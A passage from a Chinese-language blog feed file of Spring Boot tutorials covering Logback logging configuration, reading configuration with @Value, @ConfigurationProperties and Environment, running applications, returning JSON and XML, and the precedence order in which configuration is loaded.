<code>Logback</code> 日志框架记录日志，并为 <code>Logback</code> 提供了支持<code>Java Util Logging</code>, <code>Commons Logging</code>, <code>Log4J</code>, <code>SLF4J</code> 适合的桥接器以便能从这些日志门面中自由切换。即项目中不管使用哪个日志门面，Logback都能正常工作。</p><p>如下图，从 <code>spring-boot-starter-web</code> 依赖树中看出包含了默认日志框架 <code>Logback</code> 及其他的桥接器。</p><p><img src="http://qianniu.javastack.cn/18-5-24/3396845.jpg"></p><h2 id="Spring-Boot-日志实战"><a href="#Spring-Boot-日志实战" class="headerlink" title="Spring Boot 日志实战"></a>Spring Boot 日志实战</h2><p>在配置文件 <code>application.properties</code> 添加以下配置。</p><pre class="line-numbers language-none"><code class="language-none"># 日志级别logging.level.root&#x3D;DEBUG# 输出到日志文件logging.file&#x3D;d:&#x2F;logs&#x2F;javastack.log# 控制框架中的日志级别logging.level.org.springframework&#x3D;INFOlogging.level.sun&#x3D;WARN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>Application</code> 启动类中添加以下测试代码。</p><pre class="line-numbers language-none"><code class="language-none">private static final org.apache.commons.logging.Log logger1 &#x3D; org.apache.commons.logging.LogFactory.getLog(SpringBootBestPracticeApplication.class);private static final org.slf4j.Logger logger2 &#x3D; org.slf4j.LoggerFactory.getLogger(SpringBootBestPracticeApplication.class);private static final java.util.logging.Logger logger3 &#x3D; java.util.logging.Logger.getLogger(&quot;SpringBootBestPracticeApplication&quot;);@Beanpublic CommandLineRunner loggerLineRunner() &#123;return (args) -&gt; &#123;logger1.error(&quot;commons logging error...&quot;);logger1.info(&quot;commons logging info...&quot;);logger2.info(&quot;slf4j info...&quot;);logger2.info(&quot;java util logging info...&quot;);logger1.debug(&quot;commons logging debug...&quot;);&#125;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>日志输出如下。</p><pre class="line-numbers language-none"><code class="language-none">2018-05-24 17:16:21.645 ERROR 3132 --- [           main] c.j.s.SpringBootBestPracticeApplication  : commons logging error...2018-05-24 17:16:21.645  INFO 3132 --- [           main] c.j.s.SpringBootBestPracticeApplication  : commons logging info...2018-05-24 17:16:21.645  INFO 3132 --- [           main] c.j.s.SpringBootBestPracticeApplication  : slf4j info...2018-05-24 17:16:21.645  INFO 3132 --- [           main] c.j.s.SpringBootBestPracticeApplication  : java util logging info...2018-05-24 17:16:21.645 DEBUG 3132 --- [           main] c.j.s.SpringBootBestPracticeApplication  : commons logging debug...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中使用了三种不同的日志门面测试，和默认的 <code>Logback</code> 框架工作都十分正常，日志也正常输出到指定文件中了。</p><p>Spring Boot 默认提供配置的形式非常简单，只适合简单的日志应用，虽然说日志输出格式可以自定义，但日志文件如何按天滚动等其他更复杂的策略却不能配置，只能通过自定义引用日志文件的形式。</p><h2 id="Spring-Boot-定制日志文件"><a href="#Spring-Boot-定制日志文件" class="headerlink" title="Spring Boot 定制日志文件"></a>Spring Boot 定制日志文件</h2><p>简单的日志配置不能满足实际项目需求，那可以通过引用定制日志文件的形式达到目的。Spring Boot能根据类路径下的类库和配置文件自动配置对应的日志框架。</p><table><thead><tr><th>日志框架</th><th>配置文件</th></tr></thead><tbody><tr><td>Logback</td><td>logback-spring.xml, logback-spring.groovy, logback.xml, or logback.groovy</td></tr><tr><td>Log4j2</td><td>log4j2-spring.xml or log4j2.xml</td></tr><tr><td>JDK (Java Util Logging）</td><td>logging.properties</td></tr></tbody></table><p>按对应类库在 classpath 下创建对应支持的日志配置文件就行，或者通过配置 <code>logging.config</code> 指定。</p><p>既然默认是支持 <code>Logback</code> 的，那现在只要在资源根目录下创建一个 <code>logback-spring.xml</code> 文件即可。<code>xx-spring</code> 这是 Spring Boot 推荐的命名方式，否则 Spring Boot 不能完全控制日志初始化，因为默认命名配置文件 <code>logback.xml</code> 加载较早不能获取到 <code>application.properties</code> 中的配置信息。</p><p>看到这里，相信你对 Spring Boot 的日志应该有了一个全面的了解。如何使用配置文件打印日志和传统项目一样，这里就不啰嗦了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 读取配置的几种方式</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="读取application文件"><a href="#读取application文件" class="headerlink" title="读取application文件"></a>读取application文件</h2><p>在application.yml或者properties文件中添加：</p><p>info.address&#x3D;USA<br>info.company&#x3D;Spring<br>info.degree&#x3D;high</p><blockquote><h3 id="Value注解读取方式"><a href="#Value注解读取方式" class="headerlink" title="@Value注解读取方式"></a>@Value注解读取方式</h3></blockquote><pre class="line-numbers language-none"><code class="language-none">import org.springframework.beans.factory.annotation.Value;import org.springframework.stereotype.Component;@Componentpublic class InfoConfig1 &#123;@Value(&quot;$&#123;info.address&#125;&quot;)private String address;@Value(&quot;$&#123;info.company&#125;&quot;)private String company;@Value(&quot;$&#123;info.degree&#125;&quot;)private String degree;public String getAddress() &#123;return address;&#125;public void setAddress(String address) &#123;this.address &#x3D; address;&#125;public String getCompany() &#123;return company;&#125;public void setCompany(String company) &#123;this.company &#x3D; company;&#125;public String getDegree() &#123;return degree;&#125;public void setDegree(String degree) &#123;this.degree &#x3D; degree;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="ConfigurationProperties注解读取方式"><a href="#ConfigurationProperties注解读取方式" class="headerlink" title="@ConfigurationProperties注解读取方式"></a>@ConfigurationProperties注解读取方式</h3></blockquote><pre class="line-numbers language-none"><code class="language-none">@Component@ConfigurationProperties(prefix &#x3D; &quot;info&quot;)public class InfoConfig2 &#123;private String address;private String company;private String degree;public String getAddress() &#123;return address;&#125;public void setAddress(String address) &#123;this.address &#x3D; address;&#125;public String getCompany() &#123;return company;&#125;public void setCompany(String company) &#123;this.company &#x3D; company;&#125;public String getDegree() &#123;return degree;&#125;public void setDegree(String degree) &#123;this.degree &#x3D; degree;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取指定文件"><a href="#读取指定文件" class="headerlink" title="读取指定文件"></a>读取指定文件</h2><p>资源目录下建立config&#x2F;db-config.properties:</p><p>db.username&#x3D;root<br>db.password&#x3D;123456</p><blockquote><h3 id="PropertySource-Value注解读取方式"><a href="#PropertySource-Value注解读取方式" class="headerlink" title="@PropertySource+@Value注解读取方式"></a>@PropertySource+@Value注解读取方式</h3></blockquote><pre class="line-numbers language-none"><code class="language-none">@Component@PropertySource(value &#x3D; &#123; &quot;config&#x2F;db-config.properties&quot; &#125;)public class DBConfig1 &#123;@Value(&quot;$&#123;db.username&#125;&quot;)private String username;@Value(&quot;$&#123;db.password&#125;&quot;)private String password;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getPassword() &#123;return password;&#125;public void setPassword(String password) &#123;this.password &#x3D; password;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：@PropertySource不支持yml文件读取。</p><blockquote><h3 id="PropertySource-ConfigurationProperties注解读取方式"><a href="#PropertySource-ConfigurationProperties注解读取方式" class="headerlink" title="@PropertySource+@ConfigurationProperties注解读取方式"></a>@PropertySource+@ConfigurationProperties注解读取方式</h3></blockquote><pre class="line-numbers language-none"><code class="language-none">@Component@ConfigurationProperties(prefix &#x3D; &quot;db&quot;)@PropertySource(value &#x3D; &#123; &quot;config&#x2F;db-config.properties&quot; &#125;)public class DBConfig2 &#123;private String username;private String password;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getPassword() &#123;return password;&#125;public void setPassword(String password) &#123;this.password &#x3D; password;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="Environment读取方式"><a href="#Environment读取方式" class="headerlink" title="Environment读取方式"></a>Environment读取方式</h3></blockquote><p>以上所有加载出来的配置都可以通过Environment注入获取到。</p><pre class="line-numbers language-none"><code class="language-none">@Autowiredprivate Environment env;&#x2F;&#x2F; 获取参数String getProperty(String key);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从以上示例来看，Spring Boot可以通过@PropertySource,@Value,@Environment,@ConfigurationProperties来绑定变量。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 运行应用的 3 种方式</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%90%E8%A1%8C%E5%BA%94%E7%94%A8%E7%9A%84%203%20%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%90%E8%A1%8C%E5%BA%94%E7%94%A8%E7%9A%84%203%20%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>今天介绍 3 种运行 Spring Boot 应用的方式，看大家用过几种？</p><h2 id="运行-Spring-Boot-应用的-3-种方式"><a href="#运行-Spring-Boot-应用的-3-种方式" class="headerlink" title="运行 Spring Boot 应用的 3 种方式"></a>运行 Spring Boot 应用的 3 种方式</h2><h4 id="1、在-IDE-中运行"><a href="#1、在-IDE-中运行" class="headerlink" title="1、在 IDE 中运行"></a>1、在 IDE 中运行</h4><p>在 Eclipse、IDEA 中直接运行，又有以下两种方式。</p><ul><li><strong>jar 包方式</strong></li></ul><p>Spring Boot 默认采用 jar 包内嵌 Tomcat、Jetty 等 Server 的方式，并需要提供一个含有 main 方法的主类。这个时候，直接在 IDE 中运行这个 main 方法就能启动 Spring Boot 应用了。</p><p><img src="http://img.javastack.cn/18-8-24/89912145.jpg"></p><ul><li><strong>war 包方式</strong></li></ul><p>如果你的应用改装成了 war 包方式部署，这个时候就需要在 IDE 中配置 Server，然后在 Server 中加入你的 Spring Boot 项目，最后运行这个 Server 即可。</p><p>如何改装成 war 包方式运行请看这篇文章《<a href="https://mp.weixin.qq.com/s/RQAPIwQJ2jMmlcM76LJhSQ">Spring Boot 发布 jar 包转为 war 包秘籍</a>》</p><h4 id="2、打包运行"><a href="#2、打包运行" class="headerlink" title="2、打包运行"></a>2、打包运行</h4><p>当你的 Spring Boot 准备提测或者上线，都需要打成 jar 包或者 war 包运行，war 包方式这里不说直接丢到 Server 里面运行即可，这里介绍直接运行 jar 包的方式。</p><blockquote><p>$ java -jar javastack-0.0.1-SNAPSHOT.jar</p></blockquote><p>这种方式也支持开启远程调试，如：</p><blockquote><p>$ java -Xdebug -Xrunjdwp:server&#x3D;y,transport&#x3D;dt_socket,address&#x3D;8000,suspend&#x3D;n -jar javastack-0.0.1-SNAPSHOT.jar</p></blockquote><h4 id="3、用插件运行"><a href="#3、用插件运行" class="headerlink" title="3、用插件运行"></a>3、用插件运行</h4><p>可以在 IDE 或者命令行中使用 Maven 和 Gradle 插件来运行 Spring Boot 应用。</p><p>1）Maven Plugin</p><blockquote><p>$ mvn spring-boot:run</p></blockquote><p>更多详情请访问以下官方链接。</p><blockquote><p><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/">https://docs.spring.io/spring-boot/docs/current/maven-plugin/</a></p></blockquote><p>2）Gradle Plugin</p><blockquote><p>$ gradle bootRun</p></blockquote><p>更多详情请访问以下官方链接。</p><blockquote><p><a href="https://docs.spring.io/spring-boot/docs/current/gradle-plugin/reference/html/">https://docs.spring.io/spring-boot/docs/current/gradle-plugin/reference/html/</a></p></blockquote><p>最后来一张 Maven 的截图。</p><p><img src="http://img.javastack.cn/18-8-24/27826270.jpg"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在 IDE 中推荐使用插件的方式来运行，因为可以集成更多的插件化的功能，如：热部署、区别不同环境配置等。</p><p>在非 IDE 中请使用 <code>java -jar</code> 的方式，或者直接打包在 Server 中运行！</p><p>如果有收获，欢迎点赞转发！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 返回 JSON 数据，一分钟搞定！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%94%E5%9B%9E%20JSON%20%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E5%88%86%E9%92%9F%E6%90%9E%E5%AE%9A%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%94%E5%9B%9E%20JSON%20%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E5%88%86%E9%92%9F%E6%90%9E%E5%AE%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>在 WEB 项目中返回 JSON 数据是常见的交互形式，在 Spring Boot 中这一切都变得十分简单。So easy!!!</p><h2 id="如何返回-JSON-数据？"><a href="#如何返回-JSON-数据？" class="headerlink" title="如何返回 JSON 数据？"></a>如何返回 JSON 数据？</h2><p>在 Spring Boot 中返回 JSON 数据很简单，如下几步。</p><h3 id="加入依赖"><a href="#加入依赖" class="headerlink" title="加入依赖"></a>加入依赖</h3><pre class="line-numbers language-none"><code class="language-none">&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;&lt;version&gt;2.0.4.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;parent&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了 Spring Boot 必须自带的 parent 依赖外，仅仅只需要加入这个 <code>spring-boot-starter-web</code> 包即可，它会自动包含所有 JSON 处理的包，如下图所示。</p><p><img src="http://qianniu.javastack.cn/18-8-16/4664411.jpg"></p><p>这个插件感谢知识星球球友的分享，简单不错，点击文章底部的阅读原文，可以加入一起学习。</p><h3 id="返回-JSON-数据格式定义"><a href="#返回-JSON-数据格式定义" class="headerlink" title="返回 JSON 数据格式定义"></a>返回 JSON 数据格式定义</h3><h5 id="1）定义返回方式"><a href="#1）定义返回方式" class="headerlink" title="1）定义返回方式"></a>1）定义返回方式</h5><p>在 Controller 类上面用 <code>@RestController</code> 定义或者在方法上面用 <code>@ResponseBody</code> 定义，表明是在 Body 区域输出数据。</p><p>下面是使用示例：</p><pre class="line-numbers language-none"><code class="language-none">@RestControllerpublic class JsonTest &#123;@GetMapping(value &#x3D; &quot;&#x2F;user&#x2F;&#123;userId&#125;&quot;)public User getUserInfo(@PathVariable(&quot;userId&quot;) String userId) &#123;User user &#x3D; new User(&quot;Java&quot;, 18);user.setId(Long.valueOf(userId));return user;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2）自定义输出格式"><a href="#2）自定义输出格式" class="headerlink" title="2）自定义输出格式"></a>2）自定义输出格式</h5><p>上面的方法直接返回对象，对象会自动转换为 JSON 格式，不过是默认的标签，可以通过以下标签进行自定义 JSON 格式。</p><pre class="line-numbers language-none"><code class="language-none">public class User &#123;@JsonProperty(&quot;user-name&quot;)private String userName;private Long id;private Integer age;@JsonIgnoreprivate String address;@JsonInclude(JsonInclude.Include.NON_NULL)private String memo;&#x2F;&#x2F; get set 略&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;:1,&quot;age&quot;:18,&quot;user-name&quot;:&quot;Java&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面演示了几个常用的注解。</p><p><strong>@JsonProperty：</strong> 可用来自定义属性标签名称；</p><p><strong>@JsonIgnore：</strong> 可用来忽略不想输出某个属性的标签；</p><p><strong>@JsonInclude：</strong> 可用来动态包含属性的标签，如可以不包含为 null 值的属性；</p><p>更多注解可以查看这个包：</p><p><img src="http://qianniu.javastack.cn/18-8-16/13417927.jpg"></p><h3 id="如何手动完成对象-和-Json-的互转？"><a href="#如何手动完成对象-和-Json-的互转？" class="headerlink" title="如何手动完成对象 和 Json 的互转？"></a>如何手动完成对象 和 Json 的互转？</h3><p><code>jackson-databind</code> 包里面有一个 <code>com.fasterxml.jackson.databind.ObjectMapper</code> 类可以完成对象和 Json 数据的互转，下面是一个简单的合作示例。</p><pre class="line-numbers language-none"><code class="language-none">ObjectMapper objectMapper &#x3D; new ObjectMapper();String userJsonStr &#x3D; objectMapper.writeValueAsString(user);User jsonUser &#x3D; objectMapper.readValue(userJsonStr, User.class);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多相关的使用及原理可以查看这个包。</p><p>好了，Spring Boot 返回 JSON 格式数据就是这么简单，有什么不懂的可以点击阅读原文加入星球和大家一起学习讨论。</p><p>《Spring Boot 返回 XML 数据》栈长正在拼命写作中，过两天分享。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 返回 XML 数据，一分钟搞定！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%94%E5%9B%9E%20XML%20%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E5%88%86%E9%92%9F%E6%90%9E%E5%AE%9A%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%BF%94%E5%9B%9E%20XML%20%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E5%88%86%E9%92%9F%E6%90%9E%E5%AE%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 返回 XML 数据，前提必须已经搭建了 Spring Boot 项目，所以这一块代码就不贴了，可以点击查看之前分享的 <a href="https://mp.weixin.qq.com/s/cFztjzQttMwBQJqAowUZ2A">Spring Boot 返回 JSON 数据，一分钟搞定！</a>。</p><h2 id="如何返回-XML-数据？"><a href="#如何返回-XML-数据？" class="headerlink" title="如何返回 XML 数据？"></a>如何返回 XML 数据？</h2><p>那么如何返回 XML 格式数据呢？其实很简单！</p><h3 id="加入-XML-工具依赖"><a href="#加入-XML-工具依赖" class="headerlink" title="加入 XML 工具依赖"></a>加入 XML 工具依赖</h3><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;jackson-dataformat-xml&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不用带版本号，因为在 <code>spring-webmvc</code> 包中已经定义好了，只是没有把依赖传递过来而已，如下面源码所示。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;  &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;jackson-dataformat-xml&lt;&#x2F;artifactId&gt;  &lt;version&gt;2.9.5&lt;&#x2F;version&gt;  &lt;scope&gt;compile&lt;&#x2F;scope&gt;  &lt;exclusions&gt;    &lt;exclusion&gt;      &lt;artifactId&gt;jcl-over-slf4j&lt;&#x2F;artifactId&gt;      &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt;    &lt;&#x2F;exclusion&gt;  &lt;&#x2F;exclusions&gt;  &lt;optional&gt;true&lt;&#x2F;optional&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 <code>&lt;optional&gt;true&lt;/optional&gt;</code>，所以，只要手动显示加下这个依赖就行了，关于这个标签可以点击<a href="https://mp.weixin.qq.com/s/6WIX8WzoJvcBPZDI9AxQPw">这里</a>查看这篇文章。</p><h3 id="返回-XML-数据格式定义"><a href="#返回-XML-数据格式定义" class="headerlink" title="返回 XML 数据格式定义"></a>返回 XML 数据格式定义</h3><h5 id="1）定义返回方式"><a href="#1）定义返回方式" class="headerlink" title="1）定义返回方式"></a>1）定义返回方式</h5><p>在 Controller 类上面用 <code>@RestController</code> 定义或者在方法上面用 <code>@ResponseBody</code> 定义，表明是在 Body 区域输出数据。</p><h5 id="2）定义返回类型"><a href="#2）定义返回类型" class="headerlink" title="2）定义返回类型"></a>2）定义返回类型</h5><p>此时 <code>Content-Type</code> 默认为 <code>application/xhtml+xml;charset=UTF-8</code> 格式，可以手动改变下类型：<code>application/xml;charset=UTF-8</code>。</p><pre class="line-numbers language-none"><code class="language-none">@RequestMapping(value &#x3D; &quot;&#x2F;test&quot; produces &#x3D; MediaType.APPLICATION_XML_VALUE)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表明是用 <code>application/xml</code> 格式输出数据。</p><h5 id="3）定义输出格式"><a href="#3）定义输出格式" class="headerlink" title="3）定义输出格式"></a>3）定义输出格式</h5><p>控制层方法直接返回对象，对象会自动转换为 XML 格式，不过是默认的标签，可以通过以下标签进行自定义 XML 格式。</p><pre class="line-numbers language-none"><code class="language-none">@JacksonXmlRootElement(localName &#x3D; &quot;response&quot;)public class UserXmlVO &#123;@JacksonXmlProperty(localName &#x3D; &quot;user_name&quot;)private String name;@JacksonXmlElementWrapper(useWrapping &#x3D; false)@JacksonXmlProperty(localName &#x3D; &quot;order_info&quot;)private List&lt;OrderInfoVO&gt; orderList;&#x2F;&#x2F; get set 略&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面演示了几个常用的注解。</p><p><strong>@JacksonXmlRootElement：</strong> 用在类上，用来自定义根节点名称；</p><p><strong>@JacksonXmlProperty：</strong> 用在属性上，用来自定义子节点名称；</p><p><strong>@JacksonXmlElementWrapper：</strong> 用在属性上，可以用来嵌套包装一层父节点，或者禁用此属性参与 XML 转换。</p><p>更多注解可以查看这个包：</p><p><img src="http://qianniu.javastack.cn/18-8-16/89032800.jpg"></p><h3 id="如何手动完成对象XML-的互转？"><a href="#如何手动完成对象XML-的互转？" class="headerlink" title="如何手动完成对象XML 的互转？"></a>如何手动完成对象XML 的互转？</h3><p><code>jackson-dataformat-xml</code> 这个包里面有一个 <code>com.fasterxml.jackson.dataformat.xml.XmlMapper</code> 类，该类继承父类 <code>com.fasterxml.jackson.databind.ObjectMapper</code>，可以利用它来完成互转操作。</p><p>下面是几个参考方法：</p><pre class="line-numbers language-none"><code class="language-none">com.fasterxml.jackson.dataformat.xml.XmlMapper#readValuecom.fasterxml.jackson.dataformat.xml.XmlMapper#writeValuecom.fasterxml.jackson.databind.ObjectMapper#writeValueAsString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更多相关的使用及原理可以查看这个包。</p><p>好了，Spring Boot 返回 XML 格式数据就是这么简单，有什么不懂的可以点击阅读原文加入星球和大家一起学习讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 配置加载顺序</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>如果加载的配置有重复的，它们的加载顺序是这样的，数字越小的优先级越高，即优先级高的覆盖优先级低的配置。</p><ol><li>Devtools global settings properties on your home directory (~&#x2F;.spring-boot-devtools.properties when devtools is active).</li><li>@TestPropertySource annotations on your tests.</li><li>@SpringBootTest#properties annotation attribute on your tests.</li><li>Command line arguments.</li><li>Properties from SPRING_APPLICATION_JSON (inline JSON embedded in an environment variable or system property)</li><li>ServletConfig init parameters.</li><li>ServletContext init parameters.</li><li>JNDI attributes from java:comp&#x2F;env.</li><li>Java System properties (System.getProperties()).</li><li>OS environment variables.</li><li>A RandomValuePropertySource that only has properties in random.*.</li><li>Profile-specific application properties outside of your packaged jar (application-{profile}.properties and YAML variants)</li><li>Profile-specific application properties packaged inside your jar (application-{profile}.properties and YAML variants)</li><li>Application properties outside of your packaged jar (application.properties and YAML variants).</li><li>Application properties packaged inside your jar (application.properties and YAML variants).</li><li>@PropertySource annotations on your @Configuration classes.</li><li>Default properties (specified using SpringApplication.setDefaultProperties).</li></ol><p>知道了它们的加载顺序，我们就能知道从哪一步来替换配置。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 配置加载顺序详解。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F%E8%AF%A6%E8%A7%A3%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F%E8%AF%A6%E8%A7%A3%E3%80%82/</url>
      
